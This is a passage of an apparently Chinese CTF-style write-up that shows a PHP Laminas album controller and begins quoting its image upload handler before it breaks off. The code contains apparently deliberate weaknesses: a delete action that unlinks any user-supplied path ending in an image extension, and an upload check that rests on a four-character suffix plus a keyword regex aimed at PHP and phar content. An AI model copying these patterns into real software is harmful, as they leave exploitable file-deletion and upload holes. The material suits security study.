<span class="token keyword">class</span> <span class="token class-name-definition class-name">AlbumController</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractActionController</span>
<span class="token punctuation">{</span>
    <span class="token comment">// Add this property:</span>
    <span class="token keyword">private</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$white_list</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token class-name type-declaration">AlbumTable</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">white_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">indexAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ViewModel</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
            <span class="token string single-quoted-string">'albums'</span> <span class="token operator">=&gt;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span><span class="token operator">-&gt;</span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">addAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$form</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AlbumForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Add'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">isPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'form'</span> <span class="token operator">=&gt;</span> <span class="token variable">$form</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$album</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Album</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">setInputFilter</span><span class="token punctuation">(</span><span class="token variable">$album</span><span class="token operator">-&gt;</span><span class="token function">getInputFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'form'</span> <span class="token operator">=&gt;</span> <span class="token variable">$form</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$album</span><span class="token operator">-&gt;</span><span class="token function">exchangeArray</span><span class="token punctuation">(</span><span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span><span class="token operator">-&gt;</span><span class="token function">saveAlbum</span><span class="token punctuation">(</span><span class="token variable">$album</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'album'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">editAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">params</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">fromRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'album'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'add'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Retrieve the album with the specified id. Doing so raises</span>
        <span class="token comment">// an exception if the album is not found, which should result</span>
        <span class="token comment">// in redirecting to the landing page.</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token variable">$album</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span><span class="token operator">-&gt;</span><span class="token function">getAlbum</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'album'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$form</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AlbumForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token variable">$album</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Edit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$viewData</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span> <span class="token operator">=&gt;</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'form'</span> <span class="token operator">=&gt;</span> <span class="token variable">$form</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">isPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$viewData</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">setInputFilter</span><span class="token punctuation">(</span><span class="token variable">$album</span><span class="token operator">-&gt;</span><span class="token function">getInputFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$viewData</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span><span class="token operator">-&gt;</span><span class="token function">saveAlbum</span><span class="token punctuation">(</span><span class="token variable">$album</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Redirect to album list</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'album'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">deleteAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">params</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">fromRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'album'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">isPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$del</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'del'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'No'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$del</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'Yes'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span><span class="token operator">-&gt;</span><span class="token function">deleteAlbum</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token comment">// Redirect to list of albums</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'album'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token punctuation">[</span>
            <span class="token string single-quoted-string">'id'</span>    <span class="token operator">=&gt;</span> <span class="token variable">$id</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'album'</span> <span class="token operator">=&gt;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span><span class="token operator">-&gt;</span><span class="token function">getAlbum</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">imgdeleteAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imgpath'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$imgpath</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imgpath'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$imgpath</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">white_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token comment">//白名单</span>
                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$imgpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Only Img File Can Be Deleted!'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">imguploadAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$form</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UploadForm</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload-form'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">isPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// Make certain to merge the $_FILES info!</span>
            <span class="token variable">$post</span> <span class="token operator">=</span> <span class="token function">array_merge_recursive</span><span class="token punctuation">(</span>
                <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">white_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment">//白名单限制</span>
                    <span class="token variable">$cont</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/&lt;\?|php|HALT\_COMPILER/i"</span><span class="token punctuation">,</span> <span class="token variable">$cont</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Not This"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"The picture size must be more than 3kb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/public/img/'</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$base</span><span class="token punctuation">;</span>
                    <span class="token keyword">echo</span> <span class="token variable">$img_path</span><span class="token punctuation">;</span>
                    <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">saveImg</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Only Img Can Be Uploaded!'</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token comment">// Form is valid, save the form!</span>
                <span class="token comment">//return $this-&gt;redirect()-&gt;toRoute('upload-form/success');</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'form'</span> <span class="token operator">=&gt;</span> <span class="token variable">$form</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有一个文件上传功能</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">imguploadAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$form</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UploadForm</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload-form'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">isPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// Make certain to merge the $_FILES info!</span>
        <span class="token variable">$post</span> <span class="token operator">=</span> <span class="token function">array_merge_recursive</span><span class="token punctuation">(</span>
            <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">white_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment">//白名单限制</span>
                <span class="token variable">$cont</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/&lt;\?|php|HALT\_COMPILER/i"</span><span class="token punctuation">,</span> <span class="token variable">$cont</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Not This"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
